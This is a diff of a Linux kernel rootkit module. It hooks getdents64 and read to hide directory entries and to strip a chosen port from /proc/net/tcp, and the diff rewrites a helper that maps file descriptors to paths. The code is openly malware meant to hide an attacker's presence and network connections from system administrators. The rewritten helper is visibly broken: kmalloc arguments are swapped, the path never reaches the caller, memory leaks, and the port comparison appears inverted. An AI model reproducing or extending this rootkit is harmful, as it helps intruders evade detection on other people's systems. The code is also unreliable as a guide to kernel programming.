@@ -9,37 +9,7 @@
 #include <linux/list.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
-
-#include <linux/errno.h>
-#include <linux/time.h>
-#include <linux/proc_fs.h>
-#include <linux/stat.h>
-#include <linux/task_io_accounting_ops.h>
-#include <linux/capability.h>
-#include <linux/file.h>
 #include <linux/fdtable.h>
-#include <linux/seq_file.h>
-#include <linux/namei.h>
-#include <linux/mnt_namespace.h>
-#include <linux/mm.h>
-#include <linux/swap.h>
-#include <linux/rcupdate.h>
-#include <linux/kallsyms.h>
-#include <linux/stacktrace.h>
-#include <linux/resource.h>
-#include <linux/mount.h>
-#include <linux/security.h>
-#include <linux/ptrace.h>
-#include <linux/tracehook.h>
-#include <linux/cgroup.h>
-#include <linux/cpuset.h>
-#include <linux/audit.h>
-#include <linux/poll.h>
-#include <linux/nsproxy.h>
-#include <linux/oom.h>
-#include <linux/elf.h>
-#include <linux/pid_namespace.h>
-#include <linux/fs_struct.h>
 
 // TODO 
 // Hide ports
@@ -217,45 +187,18 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
-int getPathnameFromFD(int fd, char *pathname)
+void getPathnameFromFD(int fd, char *pathname)
 {
-	char *tmp;
-	struct file *file;
-	struct files_struct *files = NULL;
-	struct path path;
-	
-	//files = get_files_struct(current);
-	//put_task_struct(current);
-	files = current->files;
+	struct files_struct *current_files; 
+	struct fdtable *files_table;
+	struct path file_path;
+	char *buf = (char *)kmalloc(GFP_KERNEL,256*sizeof(char));
 
-	spin_lock(&files->file_lock);
-	file = fcheck_files(files, fd);
-	if (!file) {
-	    spin_unlock(&files->file_lock);
-	    return -ENOENT;
-	}
+	current_files = current->files;
+	files_table = files_fdtable(current_files);
 
-	path = file->f_path;
-	path_get(&file->f_path);
-	spin_unlock(&files->file_lock);
-
-	tmp = (char *)__get_free_page(GFP_TEMPORARY);
-
-	if (!tmp) {
-	    path_put(&path);
-	    return -ENOMEM;
-	}
-
-	pathname = d_path(&path, tmp, PAGE_SIZE);
-	path_put(&path);
-
-	if (IS_ERR(pathname)) {
-	    free_page((unsigned long)tmp);
-	    return PTR_ERR(pathname);
-	}
-
-	free_page((unsigned long)tmp);
-	return 0;
+	file_path = files_table->fd[fd]->f_path;
+	pathname = d_path(&file_path,buf,256*sizeof(char));
 }
 
 typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
@@ -281,15 +224,16 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	//	return -1;
 
 	// filter out hidden ports if reading /proc/net/tcp
-	if (getPathnameFromFD(fd,pathname))
-		return -1;
+	getPathnameFromFD(fd,pathname);
 	if (!strcmp(pathname,"/proc/net/tcp")) {
+		printk(KERN_INFO "Found /proc/net/tcp\n");
 		for (bp = 0; bp < result;) {
 			start_line = buf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
 			end_line = strchr(start_line,'\n');
 			diff_in_bytes = ((end_line + 1) - start_line) * sizeof(char);
 			if (strncmp(port_num,HIDE_PORT,4)) {
+				printk(KERN_INFO "Found port to hide\n");
 				memmove(start_line,end_line + 1,
 					result - bp - diff_in_bytes);
 				result -= diff_in_bytes;
